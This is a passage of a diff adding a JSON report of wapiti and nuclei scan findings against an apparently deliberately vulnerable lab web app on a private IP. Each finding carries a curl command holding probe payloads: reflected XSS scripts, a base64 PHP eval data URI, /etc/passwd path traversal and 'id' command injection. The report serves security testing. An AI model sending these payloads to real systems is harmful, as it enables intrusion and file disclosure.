+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level1.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-45",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/XSS/XSS_level1.php",
+      "fullUrl": "/www/XSS/XSS_level1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level1.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-46",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/XSS/XSS_level1.php",
+      "fullUrl": "/www/XSS/XSS_level1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-47",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/XSS/XSS_level1.php",
+      "fullUrl": "/www/XSS/XSS_level1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-48",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/XSS/XSS_level1.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+      "endpoint": "/www/XSS/XSS_level1.php",
+      "fullUrl": "/www/XSS/XSS_level1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level1.php?username=alice&submit=Submit\" -e \"http://192.168.64.2:9991/www/XSS/XSS_level1.php\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-49",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "Reflected Cross Site Scripting vulnerability found via injection in the parameter username",
+      "endpoint": "/www/XSS/XSS_level1.php",
+      "fullUrl": "/www/XSS/XSS_level1.php",
+      "method": "",
+      "parameter": "username",
+      "evidence": "username",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/XSS/XSS_level1.php?username=%3CScRiPt%3Ealert%28%27w5gj9003pt%27%29%3C%2FsCrIpT%3E&submit=Submit\" -e \"http://192.168.64.2:9991/www/XSS/XSS_level1.php\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-50",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php\""
+    },
+    {
+      "id": "wapiti-Command execution-51",
+      "tool": "wapiti",
+      "category": "Command execution",
+      "severity": "low",
+      "title": "Command execution",
+      "description": "PHP evaluation via injection in the parameter file",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-12"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-12"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php?file=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D\""
+    },
+    {
+      "id": "wapiti-Path Traversal-52",
+      "tool": "wapiti",
+      "category": "Path Traversal",
+      "severity": "low",
+      "title": "Path Traversal",
+      "description": "Linux local file disclosure vulnerability via injection in the parameter file",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-ATHZ-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-ATHZ-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php?file=%2Fetc%2Fpasswd\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-53",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-54",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-55",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-56",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php?file=1.php. The server did not enforce HTTPS.",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php?file=1.php\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-57",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "Reflected Cross Site Scripting vulnerability found via injection in the parameter file",
+      "endpoint": "/www/FileInclusion/pages/lvl1.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl1.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php?file=%3CScRiPt%3Ealert%28%27w1rqaesmtl%27%29%3C%2FsCrIpT%3E\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-58",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php\""
+    },
+    {
+      "id": "wapiti-Command execution-59",
+      "tool": "wapiti",
+      "category": "Command execution",
+      "severity": "low",
+      "title": "Command execution",
+      "description": "PHP evaluation via injection in the parameter file",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-12"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-12"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php?file=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D\""
+    },
+    {
+      "id": "wapiti-Path Traversal-60",
+      "tool": "wapiti",
+      "category": "Path Traversal",
+      "severity": "low",
+      "title": "Path Traversal",
+      "description": "Linux local file disclosure vulnerability via injection in the parameter file",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-ATHZ-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-ATHZ-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php?file=%2Fetc%2Fpasswd\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-61",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-62",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-63",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-64",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php?file=2.php. The server did not enforce HTTPS.",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php?file=2.php\""
+    },
+    {
+      "id": "wapiti-Reflected Cross Site Scripting-65",
+      "tool": "wapiti",
+      "category": "Reflected Cross Site Scripting",
+      "severity": "low",
+      "title": "Reflected Cross Site Scripting",
+      "description": "Reflected Cross Site Scripting vulnerability found via injection in the parameter file",
+      "endpoint": "/www/FileInclusion/pages/lvl2.php",
+      "fullUrl": "/www/FileInclusion/pages/lvl2.php",
+      "method": "",
+      "parameter": "file",
+      "evidence": "file",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-01"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-01"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php?file=%3CScRiPt%3Ealert%28%27w9vju2brko%27%29%3C%2FsCrIpT%3E\""
+    },
+    {
+      "id": "wapiti-Content Security Policy Configuration-66",
+      "tool": "wapiti",
+      "category": "Content Security Policy Configuration",
+      "severity": "low",
+      "title": "Content Security Policy Configuration",
+      "description": "CSP is not set for URL: http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php",
+      "endpoint": "/www/CommandExecution/CommandExec-2.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CONF-12",
+        "OSHP-Content-Security-Policy"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CONF-12",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-Content-Security-Policy"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php\""
+    },
+    {
+      "id": "wapiti-Command execution-67",
+      "tool": "wapiti",
+      "category": "Command execution",
+      "severity": "low",
+      "title": "Command execution",
+      "description": "Command execution via injection in the parameter typeBox",
+      "endpoint": "/www/CommandExecution/CommandExec-2.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-2.php",
+      "method": "",
+      "parameter": "typeBox",
+      "evidence": "typeBox",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-INPV-12"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-INPV-12"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php?typeBox=id\" -e \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php\""
+    },
+    {
+      "id": "wapiti-Clickjacking Protection-68",
+      "tool": "wapiti",
+      "category": "Clickjacking Protection",
+      "severity": "low",
+      "title": "Clickjacking Protection",
+      "description": "X-Frame-Options is not set",
+      "endpoint": "/www/CommandExecution/CommandExec-2.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Frame-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Frame-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php\""
+    },
+    {
+      "id": "wapiti-MIME Type Confusion-69",
+      "tool": "wapiti",
+      "category": "MIME Type Confusion",
+      "severity": "low",
+      "title": "MIME Type Confusion",
+      "description": "X-Content-Type-Options is not set",
+      "endpoint": "/www/CommandExecution/CommandExec-2.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "OSHP-X-Content-Type-Options"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/OSHP-X-Content-Type-Options"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-70",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+      "endpoint": "/www/CommandExecution/CommandExec-2.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php\""
+    },
+    {
+      "id": "wapiti-Unencrypted Channels-71",
+      "tool": "wapiti",
+      "category": "Unencrypted Channels",
+      "severity": "low",
+      "title": "Unencrypted Channels",
+      "description": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php?typeBox=default. The server did not enforce HTTPS.",
+      "endpoint": "/www/CommandExecution/CommandExec-2.php",
+      "fullUrl": "/www/CommandExecution/CommandExec-2.php",
+      "method": "",
+      "parameter": "",
+      "evidence": "",
+      "recommendation": "",
+      "wstg": [
+        "WSTG-CRYP-03"
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/WSTG-CRYP-03"
+      ],
+      "curlCommand": "curl \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php?typeBox=default\" -e \"http://192.168.64.2:9991/www/CommandExecution/CommandExec-2.php\""
+    },
+    {
+      "id": "nuclei-xss-72",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "medium",
+      "title": "Fuzzing Parameters - Cross-Site Scripting",
+      "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+      "impact": "N/A",
+      "endpoint": "http://192.168.64.2:9991/www/XSS/XSS_level1.php/",
+      "fullUrl": "http://192.168.64.2:9991/www/XSS/XSS_level1.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E",
+      "method": "GET",
+      "cve": null,
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/XSS/XSS_level1.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 674\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:27:30 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 1</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is '>\"<svg/onload=confirm('xss-username')></body>\n</html>\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' 'http://192.168.64.2:9991/www/XSS/XSS_level1.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E'",
+      "ip": "192.168.64.2"
+    },
+    {
+      "id": "nuclei-xss-73",
+      "tool": "nuclei",
+      "category": "XSS",
+      "severity": "medium",
+      "title": "Django Debug Page - Cross-Site Scripting",
+      "description": "Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping disabled in a portion of the template for the technical 500 debug page. We detected that right circumstances (DEBUG=True) are present to allow a cross-site scripting attack.\n",
+      "impact": "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.\n",
+      "endpoint": "http://192.168.64.2:9991/www/XSS/XSS_level1.php/create_user/",
+      "fullUrl": "http://192.168.64.2:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+      "method": "GET",
+      "cve": "cve-2017-12794",
+      "evidence": "",
+      "recommendation": "",
+      "references": [],
+      "request": "GET /www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1\r\nHost: 192.168.64.2:9991\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
